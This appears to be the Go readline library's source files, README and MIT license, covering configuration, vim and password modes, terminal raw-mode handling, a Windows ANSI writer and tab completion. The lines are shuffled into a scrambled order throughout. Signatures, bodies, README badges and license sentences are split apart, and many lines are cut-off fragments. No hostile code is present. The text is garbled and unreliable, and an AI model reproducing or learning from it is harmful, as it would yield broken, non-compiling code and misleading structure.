Instance) GenPasswordConfig() 
return i.Operation.SaveHistory(content)
Result) CanContinue() bool {
c.inited = true
// Readline is a pure go implementation for GNU-Readline kind library.
"Instance) WriteStdin(val []byte) (int, error) {"
type Config struct {
"c.InterruptPrompt = """
"return i.Operation.PasswordEx(prompt, l)"
if c.inited {
"c.EOFPrompt = """""
c.opSearch = nil
Instance) SetPrompt(s string) {
if c.FuncGetWidth == nil {
for {
FuncMakeRaw         func() error
 err != nil {
"} else if c.InterruptPrompt == """
//  i := readline.New()
return i.Operation.Password(prompt)
if c.FuncExitRaw == nil {
return err
"// If VimMode is true, readline will in vim.insert mode by default"
old := i.Config
"Operation: rl,"
HistorySearchFold bool
Terminal
UniqueEditLine bool
"Instance) Readline() (string, error) {"
// example:
c.FuncGetWidth = GetScreenWidth
break
Instance) SaveHistory(content string) error {
return i.Operation.String()
Instance) ReadPasswordWithConfig(cfg 
FuncGetWidth func() int
if err != nil {
return true
i.Operation.SetConfig(cfg)
Stdin       io.ReadCloser
"// err is one of (nil, io.EOF, readline.ErrInterrupt)"
c.Painter = p
"Instance) ReadPassword(prompt string) ([]byte, error) {"
Terminal  
// enable case-insensitive history searching
Stderr      io.Writer
"Config:    cfg,"
Operation
// private fields
opHistory 
"rl, err := readline.New(""> "")"
"line, err := rl.Readline()"
c.FuncExitRaw = rm.Exit
if cfg.Painter == nil {
"Result{ret, err}"
return i.Operation.Stderr()
opSearch
"//  i.WriteStdin([]byte(""test""))"
Instance) ResetHistory() {
func (i 
"// specify the max length of historys, it's 500 by default, set it to -1 to disable history"
if err != nil { // io.EOF
"t, err := NewTerminal(cfg)"
Error error
func (c 
if c.FuncMakeRaw == nil {
Result {
"ret, err := i.Readline()"
// same as readline
return i.Operation.GenPasswordConfig()
Instance) Refresh() {
// readline will refresh automatic when write through Stdout()
i.Operation.history.Disable()
"c.Stdin, c.StdinWriter = NewFillableStdin(c.Stdin)"
package readline
return len(l.Line) != 0 
"c.EOFPrompt = """
// AutoCompleter will called once user press TAB
"}, nil"
i.Config.Stdin.Close()
i.Operation.SetBuffer(what)
defer rl.Close()
HistoryLimit           int
i.Operation.SetVimMode(on)
return !l.CanContinue() 
c.Listener = FuncListener(f)
"Instance) ReadSlice() ([]byte, error) {"
Result) CanBreak() bool {
if c.AutoComplete == nil {
Config    
FuncIsTerminal      func() bool
i.Operation.history.Enable()
rm := new(RawMode)
return 
 l.Error == ErrInterrupt
InterruptPrompt string
Config{Prompt: prompt})
VimMode bool
c.HistoryLimit = 500
Operation 
"return nil, err"
i.Terminal.SetConfig(cfg)
Instance) Stderr() io.Writer {
c.Stdout = Stdout
Config) 
if c.Stdin == nil {
Config {
return i.Operation.IsEnableVimMode()
"Instance) ReadlineWithDefault(what string) (string, error) {"
"} else if c.EOFPrompt == """
FuncOnWidthChanged  func(func())
i.Config = cfg
c.AutoComplete = 
return NewEx(
i.Operation.Clean()
if c.FuncIsTerminal == nil {
// we must make sure that call Close() before process exit.
// switch VimMode in runtime
AutoComplete AutoCompleter
"if c.EOFPrompt == """" {"
// change history persistence in runtime
rl := t.Readline()
ForceUseInteractive bool
opHistory
FuncExitRaw         func() error
DisableAutoSaveHistory bool
"Instance) Write(b []byte) (int, error) {"
if c.ForceUseInteractive {
Instance) Clean() {
Instance) SetMaskRune(r rune) {
"// NOTE: Listener will be triggered by (nil, 0, 0) immediately"
return i.Stdout().Write(b)
cfg.Painter = 
type Result struct {
// erase the editing line after user submited it
c.FuncOnWidthChanged = DefaultOnWidthChanged
"Config) SetListener(f func(line []rune, pos int, key rune) (newLine []rune, newPos int, ok bool)) {"
i.Operation.Close()
// HistoryDisable the save of the commands into the history
c.FuncMakeRaw = rm.Enter
if i.Config == cfg {
Config) useInteractive() bool {
// filter input runes (may be used to disable CtrlZ or for translating some keys to different actions)
Listener Listener
c.Stderr = Stderr
i.Operation.SetHistoryPath(p)
"Instance, error) {"
// we can generate a config by 
Config) SetPainter(p Painter) {
HistoryFile string
// -> output = new (translated) rune and true/false if continue with processing this one
if err := i.Terminal.Close()
Instance) SetVimMode(on bool) {
func NewEx(cfg 
Config) Init() error {
if c.Stdout == nil {
Stdout      io.Writer
StdinWriter io.Writer
return i.Terminal.WriteStdin(val)
"FuncFilterInputRune func(rune) (rune, bool)"
Config
case VIM_VISUAL:
case 'l':
o.vimMode = VIM_NORMAL
type opVim struct {
case 'c':
"case CharEnter, CharInterrupt:"
cfg     
opVim) ExitVimInsertMode() {
default:
opVim{
rb := o.op.buf
case 'j':
"opVim) handleVimNormalEnterInsert(r rune, readNext func() rune) (t rune, handled bool) {"
case VIM_INSERT:
ov := 
case 'I':
next := readNext()
case 'p':
if o.vimMode == VIM_NORMAL {
rb.MoveToEndWord()
op      
rb.MoveToNextWord()
return 0
 !on { // turn off
 handled {
 r == 'T'
switch next {
case 'w':
prevChar := r == 't' 
case 'i':
opVim) ExitVimMode() {
o.vimMode = VIM_INSERT
rb.MoveForward()
"return o.HandleVimNormal(r, readNext)"
Operation) 
return ov
t = CharForward
"case '0', '"
func (o 
if rb.IsCursorInEnd() {
rb.MoveToLineStart()
rb.DeleteWord()
rb.MoveToLineEnd()
// invalid operation
case 'k':
VIM_NORMAL = iota
"opVim) HandleVimNormal(r rune, readNext func() rune) (t rune) {"
"return t, true"
Operation
case 'x':
func newVimMode(op 
ov.SetVimMode(ov.cfg.VimMode)
o.ExitVimInsertMode()
case 'h':
"case 'w', 'W':"
"if r, handled := o.handleVimNormalMovement(r, readNext)"
rb.Yank()
o.EnterVimInsertMode()
package readline
case 'r':
case CharEsc:
handled = true
return r
opVim) EnterVimInsertMode() {
vimMode int
return o.cfg.VimMode
if r == CharEsc {
"opVim) handleVimNormalMovement(r rune, readNext func() rune) (t rune, handled bool) {"
"case 'f', 'F', 't', 'T':"
o.cfg.VimMode = on
o.ExitVimMode()
opVim) SetVimMode(on bool) {
switch o.vimMode {
"op:  op,"
"opVim) HandleVim(r rune, readNext func() rune) rune {"
opVim {
t = CharBackward
t = CharNext
switch r {
VIM_INSERT
case '$':
case 'd':
reverse := r == 'F' 
rb.Erase()
case 'S':
"case 'e', 'E':"
t = CharPrev
rb.Replace(readNext())
"cfg: op.cfg,"
case 's':
"if r, handled := o.handleVimNormalEnterInsert(r, readNext)"
"rb.MoveTo(next, prevChar, reverse)"
if o.cfg.VimMode 
rb.MoveToPrevWord()
opVim) IsEnableVimMode() bool {
o.op.t.Bell()
"return r, false"
rb.MoveBackward()
return
VIM_VISUAL
"case 'b', 'B':"
case 'a':
case 'A':
rb.Delete()
const (
rb.Backspace()
"<a href=""https://opencollective.com/readline/sponsor/20/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/20/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/8/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/8/avatar.svg""></a>"
backer)]
"<a href=""https://opencollective.com/readline/sponsor/1/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/1/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/18/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/18/avatar.svg""></a>"
Linux
label=remind101/empire)](https://github.com/remind101/empire)
 Backers
"<a href=""https://opencollective.com/readline/backer/23/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/23/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/16/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/16/avatar.svg""></a>"
label=Netflix/hal-9001)](https://github.com/Netflix/hal-9001)
sponsor)]
"<a href=""https://opencollective.com/readline/sponsor/9/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/9/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/15/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/15/avatar.svg""></a>"
label=youtube/doorman)](https://github.com/youtube/doorman)
"<a href=""https://opencollective.com/readline/sponsor/27/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/27/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/14/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/14/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/1/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/1/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/12/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/12/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/6/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/6/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/22/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/22/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/25/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/25/avatar.svg""></a>"
 Repos using readline
"<a href=""https://opencollective.com/readline/sponsor/24/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/24/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/17/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/17/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/3/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/3/avatar.svg""></a>"
label=bom-d-van/harp)](https://github.com/bom-d-van/harp)
A powerful readline library in 
"<a href=""https://opencollective.com/readline/backer/21/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/21/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/15/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/15/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/0/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/0/avatar.svg""></a>"
[![docker/go-p9p](https://img.shields.io/github/stars/docker/go-p9p.svg
label=abiosoft/ishell)](https://github.com/abiosoft/ishell)
"<a href=""https://opencollective.com/readline/sponsor/5/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/5/avatar.svg""></a>"
[![cockroachdb](https://img.shields.io/github/stars/cockroachdb/cockroach.svg
"<a href=""https://opencollective.com/readline/sponsor/29/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/29/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/10/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/10/avatar.svg""></a>"
 [Shortcut](doc/shortcut.md)
"<a href=""https://opencollective.com/readline/sponsor/28/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/28/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/10/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/10/avatar.svg""></a>"
</p>
"<img src=""https://raw.githubusercontent.com/chzyer/readline/assets/logo_f.png"" />"
[![GoDoc](https://godoc.org/github.com/chzyer/readline
status.svg)](https://godoc.org/github.com/chzyer/readline)
Become a sponsor and get your logo here on our Github page. [[Become a sponsor](https://opencollective.com/readline
Windows
"<a href=""https://opencollective.com/readline/sponsor/7/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/7/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/28/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/28/avatar.svg""></a>"
[![abiosoft/ishell](https://img.shields.io/github/stars/abiosoft/ishell.svg
branch=master)](https://travis-ci.org/chzyer/readline)
"<a href=""https://opencollective.com/readline/sponsor/17/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/17/avatar.svg""></a>"
[![Build Status](https://travis-ci.org/chzyer/readline.svg
 [http://weibo.com/2145262190](http://weibo.com/2145262190)
"<a href=""https://opencollective.com/readline/backer/14/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/14/avatar.svg""></a>"
"If you have any questions, please submit a github issue and any pull requests is welcomed :)"
"<a href=""https://opencollective.com/readline/sponsor/4/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/4/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/13/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/13/avatar.svg""></a>"
label=knq/usql)](https://github.com/knq/usql)
"<a href=""https://opencollective.com/readline/backer/6/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/6/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/5/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/5/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/26/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/26/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/3/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/3/avatar.svg""></a>"
"<a href=""https://asciinema.org/a/32oseof9mkilg7t7d4780qt4m"" target=""_blank""><img src=""https://asciinema.org/a/32oseof9mkilg7t7d4780qt4m.png"" width=""654""/></a>"
Love Readline
"<a href=""https://opencollective.com/readline/sponsor/16/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/16/avatar.svg""></a>"
[![mehrdadrad/mylg](https://img.shields.io/github/stars/mehrdadrad/mylg.svg
label=docker/go-p9p)](https://github.com/docker/go-p9p)
"<img src=""https://raw.githubusercontent.com/chzyer/readline/assets/logo.png"" />"
[![OpenCollective](https://opencollective.com/readline/badge/sponsors.svg)](
"<a href=""https://opencollective.com/readline/backer/4/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/4/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/12/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/12/avatar.svg""></a>"
[![Version](https://img.shields.io/github/tag/chzyer/readline.svg)](https://github.com/chzyer/readline/releases)
 Help me keep it alive by donating funds to cover project expenses!<br />
"<a href=""https://opencollective.com/readline/backer/7/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/7/avatar.svg""></a>"
backers)
"<a href=""https://opencollective.com/readline/backer/2/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/2/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/19/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/19/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/8/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/8/avatar.svg""></a>"
"<p align=""center"">"
[![knq/usql](https://img.shields.io/github/stars/knq/usql.svg
"<a href=""https://opencollective.com/readline/sponsor/0/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/0/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/23/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/23/avatar.svg""></a>"
 Sponsors
[![youtube/doorman](https://img.shields.io/github/stars/youtube/doorman.svg
[![Netflix/hal-9001](https://img.shields.io/github/stars/Netflix/hal-9001.svg
"<a href=""https://opencollective.com/readline/backer/11/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/11/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/27/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/27/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/13/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/13/avatar.svg""></a>"
Solaris
[![Software License](https://img.shields.io/badge/license-MIT-brightgreen.svg)](LICENSE.md)
label=cockroachdb/cockroach)](https://github.com/cockroachdb/cockroach)
[![OpenCollective](https://opencollective.com/readline/badge/backers.svg)](
"<a href=""https://opencollective.com/readline/backer/20/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/20/avatar.svg""></a>"
 [https://twitter.com/chzyer](https://twitter.com/chzyer)
"<a href=""https://opencollective.com/readline/backer/26/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/26/avatar.svg""></a>"
 Guide
[![robertkrimen/otto](https://img.shields.io/github/stars/robertkrimen/otto.svg
"<a href=""https://opencollective.com/readline/sponsor/11/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/11/avatar.svg""></a>"
[![bom-d-van/harp](https://img.shields.io/github/stars/bom-d-van/harp.svg
 Feedback
sponsors)
"<a href=""https://opencollective.com/readline/backer/19/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/19/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/22/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/22/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/25/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/25/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/sponsor/18/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/18/avatar.svg""></a>"
label=mehrdadrad/mylg)](https://github.com/mehrdadrad/mylg)
[![empire](https://img.shields.io/github/stars/remind101/empire.svg
"<a href=""https://opencollective.com/readline/backer/24/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/24/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/29/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/29/avatar.svg""></a>"
macOS
"<a href=""https://opencollective.com/readline/sponsor/21/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/21/avatar.svg""></a>"
"<a href=""https://opencollective.com/readline/backer/9/website"" target=""_blank""><img src=""https://opencollective.com/readline/backer/9/avatar.svg""></a>"
 [Demo](example/readline-demo/readline-demo.go)
"<a href=""https://opencollective.com/readline/sponsor/2/website"" target=""_blank""><img src=""https://opencollective.com/readline/sponsor/2/avatar.svg""></a>"
[[Become a backer](https://opencollective.com/readline
label=robertkrimen/otto)](https://github.com/robertkrimen/otto)
Config
Config {
Config) (err error) {
Operation
Painter:         
"EOFPrompt:       """
"HistoryLimit:    -1,"
"InterruptPrompt: """
"o.backupCfg, err = o.o.SetConfig(cfg)"
opPassword) PasswordConfig() 
"Stderr: o.o.cfg.Stderr,"
backupCfg 
Config{
o.backupCfg = nil
"defaultPainter{},"
"Stdout: o.o.cfg.Stdout,"
type opPassword struct {
Operation) 
opPassword {
package readline
opPassword) ExitPasswordMode() {
opPassword{o: o}
o.o.SetConfig(o.backupCfg)
func newOpPassword(o 
opPassword) EnterPasswordMode(cfg 
func (o 
return
"EnableMask:      true,"
return 
o         
"of this software and associated documentation files (the ""Software""), to deal"
copies or substantial portions of the Software.
"copies of the Software, and to permit persons to whom the Software is"
"furnished to do so, subject to the following conditions:"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
The MIT License (MIT)
SOFTWARE.
"in the Software without restriction, including without limitation the rights"
Copyright (c) 2015 Chzyer
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
The above copyright notice and this permission notice shall be included in all
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"dimensions)), 0, 0, 0)"
if err != 0 {
// GetSize returns the dimensions of the given terminal.
"return 0, 0, err"
var dimensions [4]uint16
"build darwin dragonfly freebsd linux,!appengine netbsd openbsd"
// Copyright 2011 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
package readline
import (
"""unsafe"""
// license that can be found in the LICENSE file.
type Termios syscall.Termios
"func GetSize(fd int) (int, int, error) {"
"return int(dimensions[1]), int(dimensions[0]), nil"
"""syscall"""
"_, _, err := syscall.Syscall6(syscall.SYS_IOCTL, uintptr(fd), uintptr(syscall.TIOCGWINSZ), uintptr(unsafe.Pointer("
.vscode/
"_, _, err := syscall.Syscall6(syscall.SYS_IOCTL, uintptr(fd), syscall.TIOCGETA, uintptr(unsafe.Pointer(termios)), 0, 0, 0)"
"return nil, err"
import (
func getTermios(fd int) (
build darwin dragonfly freebsd netbsd openbsd
"""syscall"""
if err != 0 {
Termios) error {
// Copyright 2013 The Go Authors. All rights reserved.
return nil
// Use of this source code is governed by a BSD-style
package readline
// license that can be found in the LICENSE file.
"_, _, err := syscall.Syscall6(syscall.SYS_IOCTL, uintptr(fd), syscall.TIOCSETA, uintptr(unsafe.Pointer(termios)), 0, 0, 0)"
return err
"func setTermios(fd int, termios "
"return termios, nil"
"""unsafe"""
termios := new(Termios)
"Termios, error) {"
COMMON_LVB_BOLD       = 0x0007
a.wantFlush = false
"sbi.dwCursorPosition.ptr(),"
case 'm':
const (
type ANSIWriter struct {
if r >= 'A' 
if size == 0 {
defer a.Unlock()
off := 0
"return off, nil"
var err error
"ANSIWriter) Write(b []byte) (int, error) {"
"COLOR_BGREEN,                            // 42: Green"
 sbi.dwSize.x
default:
" COLOR_FGREEN, // 37: White"
color := word(0)
return nil
info.dwCursorPosition.x -= count
"COLOR_BBLUE,                             // 44: Blue"
COLOR_FRED 
"0,                                       // 40: Black"
a.target.Flush()
[]string) bool {
"COLOR_FRED,                              // 31: Red"
a.isEsc = false
info.dwCursorPosition.x 
} else if c == 4 {
"COLOR_FBLUE,                             // 34: Blue"
if len(arg) == 0 {
007': // set title
a.isEsc = true
"r, size := utf8.DecodeRune(b[off:])"
case 'D': // left
= COMMON_LVB_UNDERSCORE 
"""strconv"""
COMMON_LVB_UNDERSCORE = 0x8000
arg := 
" strings.Join(arg, """
argptr = arg
"ctx:    NewANSIWriterCtx(w),"
"for _, item := range arg {"
for len(b) > off {
argptr
wantFlush bool
bufio.Writer
"""strings"""
"0,                                       // 30: Black"
 c < 50 {
COLOR_FGREEN     = 0x0002
COLOR_FINTENSITY = 0x0008
" COLOR_BBLUE,              // 46: Cyan"
"return kernel.FillConsoleOutputCharacterW(stdout, uintptr(' '),"
 r == CharEsc {
var written int
a.ctx.process(r)
wg     sync.WaitGroup
ANSIWriter) Close() error {
case 'A': // up
a.Lock()
"bufio.Writer, r rune, argptr "
COLOR_FGREEN 
" COLOR_FBLUE,              // 36: Cyan"
type ANSIWriterCtx struct {
ANSIWriterCtx) process(r rune) bool {
 r <= 'D' {
info.dwCursorPosition.y -= count
a.target.WriteRune(r)
"uintptr(size),"
if a.isEscSeq {
eraseLine()
" COLOR_FBLUE,                // 35: Magenta"
target io.Writer
isEsc     bool
info.dwCursorPosition.y 
size 
COLOR_BBLUE      = 0x0010
 COLOR_FINTENSITY
case 'K':
var ColorTableFg = []word{
COLOR_BGREEN 
color = ColorTableFg[7]
ANSIWriterCtx) ioloopEscSeq(w 
return err
a.ctx.Flush()
sync.Mutex
isEscSeq  bool
ANSIWriterCtx
} else if c == 1 {
"count := short(GetInt(arg, 1))"
ANSIWriterCtx{
 ColorTableFg[7]
break
ctx    
"target: w,"
color 
"c, err = strconv.Atoi(item)"
if a.isEsc {
return true
if err != nil {
} else if c >= 40 
func eraseLine() error {
COLOR_FRED       = 0x0004
" ""m"")"
func NewANSIWriterCtx(target io.Writer) 
"written)),"
if len(arg) == 0 
COLOR_BRED 
uintptr(unsafe.Pointer(
import (
"sbi, err := GetConsoleScreenBufferInfo()"
sbi.dwCursorPosition.x = 0
= count
SetConsoleCursorPosition(
"COLOR_FGREEN,                            // 32: Green"
COLOR_FBLUE      = 0x0001
a.wantFlush = true
a := 
"w.WriteString(""["" "
COLOR_BRED       = 0x0040
if a.wantFlush {
_                = uint16(0)
ANSIWriter{
a.arg = nil
case '[':
off 
" COLOR_FGREEN,               // 33: Yellow"
killLines()
ANSIWriterCtx) Flush() {
"kernel.SetConsoleTextAttribute(stdout, uintptr(color))"
size := (sbi.dwCursorPosition.y - sbi.dwSize.y) 
package readline
case CharEsc:
= sbi.dwCursorPosition.x
var ColorTableBg = []word{
case '
"target: bufio.NewWriter(target),"
func (a 
"info, err := GetConsoleScreenBufferInfo()"
if c >= 30 
= COLOR_FINTENSITY
" COLOR_BGREEN, // 47: White"
size := sbi.dwSize.x
info.dwCursorPosition)
= COLOR_BINTENSITY
 COLOR_BBLUE 
return 
 COLOR_FBLUE 
"COLOR_BRED,                              // 41: Red"
fallthrough
COLOR_BINTENSITY = 0x0080
= ColorTableFg[c-30]
"arg = append(arg, """")"
COLOR_BGREEN     = 0x0020
func NewANSIWriter(w io.Writer) 
a.arg)
if r == 0 
= COMMON_LVB_BOLD 
case 'B': // down
"""unicode/utf8"""
return a
arg       []string
= string(r)
 c < 40 {
func killLines() error {
" arg[len(arg)-1] != """" {"
switch r {
" COLOR_BGREEN,               // 43: Yellow"
a.isEscSeq = true
= ColorTableBg[c-40]
target    
"return off, io.ErrShortWrite"
case 'C': // right
return false
= size
"""io"""
build windows
"""bufio"""
"""sync"""
ANSIWriter {
arg[len(arg)-1] 
var c int
"a.isEscSeq = a.ioloopEscSeq(a.target, r, "
case 'J':
argptr = nil
"kernel.FillConsoleOutputAttribute(stdout, uintptr(ColorTableFg[7]),"
"""unsafe"""
} else { // unknown code treat as reset
a.wg.Wait()
ANSIWriterCtx {
" COLOR_BBLUE,                // 45: Magenta"
"func GetSize(fd int) (width, height int, err error) {"
State) error {
 enableProcessedInput 
"_, _, e = syscall.Syscall(procSetConsoleMode.Addr(), 2, uintptr(fd), uintptr(st), 0)"
"procSetConsoleMode             = kernel32.NewProc(""SetConsoleMode"")"
"func ReadPassword(fd int) ([]byte, error) {"
"_, _, e := syscall.Syscall(procGetConsoleMode.Addr(), 2, uintptr(fd), uintptr(unsafe.Pointer("
"return nil, error(e)"
= (enableEchoInput)
// ReadPassword reads a line of input from a terminal without local echo.  This
"procGetConsoleScreenBufferInfo = kernel32.NewProc(""GetConsoleScreenBufferInfo"")"
enableProcessedInput  = 1
maximumWindowSize coord
"info)), 0)"
"r, _, e := syscall.Syscall(procGetConsoleMode.Addr(), 2, uintptr(fd), uintptr(unsafe.Pointer("
enableProcessedOutput = 1
"_, _, err := syscall.Syscall(procSetConsoleMode.Addr(), 2, uintptr(fd), uintptr(state.mode), 0)"
right  short
"State, error) {"
x short
"procGetConsoleMode             = kernel32.NewProc(""GetConsoleMode"")"
"State{st}, nil"
n' {
enableQuickEditMode   = 64
type (
"oldState, err := terminal.MakeRaw(0)"
if n > 0 
enableExtendedFlags   = 128
= (enableProcessedInput 
r' {
enableMouseInput      = 16
bottom short
"""syscall"""
func MakeRaw(fd int) (
"return int(info.size.x), int(info.size.y), nil"
// Putting a terminal into raw mode is the most common requirement:
if e != 0 {
        panic(err)
coord struct {
type State struct {
size              coord
func IsTerminal(fd int) bool {
var ret []byte
old := st
raw := st 
window            smallRect
for {
// license that can be found in the LICENSE file.
// GetState returns the current state of a terminal which may be useful to
return err
consoleScreenBufferInfo struct {
left   short
if buf[n-1] == '
// restore the terminal after a signal.
enableEchoInput       = 4
func GetState(fd int) (
// GetSize returns the dimensions of the given terminal.
break
// Copyright 2011 The Go Authors. All rights reserved.
"n, err := syscall.Read(syscall.Handle(fd), buf[:])"
if err != nil {
// MakeRaw put the terminal connected to the given file descriptor into raw
// previous state.
"ret = append(ret, buf[:n]...)"
 (enableEchoInput 
// Restore restores the terminal connected to the given file descriptor to a
// mode and returns the previous state of the terminal so that it can be
import (
smallRect struct {
 enableProcessedOutput)
attributes        word
"defer terminal.Restore(0, oldState)"
var buf [16]byte
"st)), 0)"
top    short
"// Package terminal provides support functions for dealing with terminals, as"
enableLineInput       = 2
defer func() {
cursorPosition    coord
"return nil, io.EOF"
enableAutoPosition    = 256
package readline
var st uint32
enableWindowInput     = 8
"return 0, 0, error(e)"
if len(ret) == 0 {
mode uint32
// IsTerminal returns true if the given file descriptor is a terminal.
return 
if n == 0 {
enableInsertMode      = 32
"return nil, err"
// commonly found on UNIX systems.
// returned does not include the 
return r != 0 
var info consoleScreenBufferInfo
// restored.
 e == 0
"syscall.Syscall(procSetConsoleMode.Addr(), 2, uintptr(fd), uintptr(old), 0)"
// is commonly used for inputting passwords and other sensitive data. The slice
"return ret, nil"
"func restoreTerm(fd int, state "
"_, _, e = syscall.Syscall(procSetConsoleMode.Addr(), 2, uintptr(fd), uintptr(raw), 0)"
"""io"""
build windows
// Use of this source code is governed by a BSD-style
"_, _, e := syscall.Syscall(procGetConsoleScreenBufferInfo.Addr(), 2, uintptr(fd), uintptr(unsafe.Pointer("
enableWrapAtEolOutput = 2
 buf[n-1] == '
if n < len(buf) {
"var kernel32 = syscall.NewLazyDLL(""kernel32.dll"")"
 enableLineInput 
"""unsafe"""
y short
var (
const (
"func SegmentFunc(f func([][]rune, int) [][]rune) AutoCompleter {"
"ret = append(ret, cand[len(lastSegment):])"
type dumpSegmentCompleter struct {
SegmentComplete {
"SegmentCompleter: completer,"
"//   DoTree([a, a1, a], 1) [a11]"
SegmentComplete{
"SegmentComplete) Do(line []rune, pos int) (newLine [][]rune, offset int) {"
"if !runes.HasPrefix(cand, lastSegment) {"
"f func([][]rune, int) [][]rune"
--- a11
"newLine, offset = RetSegment(segment, cands, idx)"
- a2
segs := [][]rune{}
"//   DoTree([a, a1, ], 0) [a11]"
lastIdx = idx
1:])
// input:
"func SplitSegment(line []rune, pos int) ([][]rune, int) {"
"//   DoTree([a, a1], 2) [a1]"
"cands := c.DoSegment(segment, idx)"
lastSegment := segments[len(segments)-1]
type SegmentCompleter interface {
"return d.f(segment, n)"
"DoSegment([][]rune, int) [][]rune"
"//   DoTree([a, a], 1) [a1, a2]"
"for _, cand := range cands {"
type SegmentComplete struct {
lastIdx := -1
"for idx, l := range line {"
"return segs, pos"
"//   DoTree([a], 1) [a]"
func (c 
continue
if l == ' ' {
// a
